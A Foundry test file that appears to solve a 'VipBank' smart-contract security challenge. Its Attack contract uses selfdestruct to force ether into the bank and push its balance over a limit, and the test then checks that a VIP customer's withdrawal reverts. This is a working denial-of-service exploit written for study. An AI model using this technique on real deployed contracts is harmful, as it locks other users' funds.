// SPDX-License-Identifier: MIT

pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "../src/3-VipBank/Bank.sol";

contract Attack {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    receive() external payable {}

    function exp() public {
        selfdestruct(payable(target));
    }
}

contract BankTest is Test {
    VIP_Bank target;
    address admin;
    address attacker;
    address customer;

    function setUp() public {
        admin = makeAddr("admin");
        attacker = makeAddr("attacker");
        customer = makeAddr("customer");
        vm.deal(attacker, 10 ether);
        vm.deal(customer, 10 ether);
        vm.startPrank(admin);
        target = new VIP_Bank();
        target.addVIP(customer);
        vm.stopPrank();
    }

    function att() public {
        vm.startPrank(customer);
        target.deposit{value: 0.05 ether}();
        vm.stopPrank();
        vm.startPrank(attacker);
        assertEq(0.05 ether, target.contractBalance());
        Attack attack = new Attack(address(target));
        payable(attack).transfer(1 ether);
        attack.exp();
        vm.stopPrank();
        assertEq(target.contractBalance(), 1.05 ether);
        vm.startPrank(customer);
        vm.expectRevert();
        target.withdraw(0.05 ether);
    }
}
